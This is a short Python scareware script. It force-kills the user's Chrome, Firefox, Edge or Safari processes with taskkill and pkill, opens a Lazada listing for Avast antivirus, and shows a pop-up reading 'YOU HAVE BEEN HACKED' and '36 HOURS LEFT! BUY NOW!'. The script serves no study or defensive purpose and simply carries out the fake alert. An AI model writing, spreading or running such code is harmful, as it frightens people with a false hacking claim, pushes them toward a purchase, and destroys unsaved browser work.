import webbrowser
import os
import platform
import ctypes
from tkinter import Tk, messagebox

def close_other_browsers():
    """Close all other browser processes."""
    system = platform.system()
    if system == "Windows":
        os.system('taskkill /IM chrome.exe /F')
        os.system('taskkill /IM firefox.exe /F')
        os.system('taskkill /IM msedge.exe /F')
    elif system == "Linux":
        os.system('pkill chrome')
        os.system('pkill firefox')
    elif system == "Darwin":  # macOS
        os.system('pkill -f Safari')

def show_popup():
    """Display a pop-up message."""
    root = Tk()
    root.withdraw()  # Hide the main Tkinter window
    messagebox.showinfo("YOU HAVE BEEN HACKED", "36 HOURS LEFT! BUY NOW!")

def open_website():
    """Open the website in the default browser."""
    url = "https://www.lazada.com.ph/products/avast-premium-security-2024-full-features-windows-only-i3261240358-s16445431945.html?c=&channelLpJumpArgs=&clickTrackInfo=query%253Aantivirus%253Bnid%253A3261240358%253Bsrc%253ALazadaMainSrp%253Brn%253A8a8272620f5e523edcb6430c38b1cda1%253Bregion%253Aph%253Bsku%253A3261240358_PH%253Bprice%253A146.76%253Bclient%253Adesktop%253Bsupplier_id%253A500165949579%253Bbiz_source%253Ah5_hp%253Bslot%253A1%253Butlog_bucket_id%253A470687%253Basc_category_id%253A5189%253Bitem_id%253A3261240358%253Bsku_id%253A16445431945%253Bshop_id%253A1663635%253BtemplateInfo%253A107881_D_E%2523-1_A3_C%2523&freeshipping=1&fs_ab=2&fuse_fs=&lang=en&location=Cavite&price=146.76&priceCompare=skuId%3A16445431945%3Bsource%3Alazada-search-voucher%3Bsn%3A8a8272620f5e523edcb6430c38b1cda1%3BoriginPrice%3A14676%3BdisplayPrice%3A14676%3BsinglePromotionId%3A900000039240155%3BsingleToolCode%3ApromPrice%3BvoucherPricePlugin%3A0%3Btimestamp%3A1732984836699&ratingscore=4.6&request_id=8a8272620f5e523edcb6430c38b1cda1&review=85&sale=216&search=1&source=search&spm=a2o4l.searchlist.list.1&stock=1"
    webbrowser.open(url)

if __name__ == "__main__":
    close_other_browsers()
    open_website()
    show_popup()
    
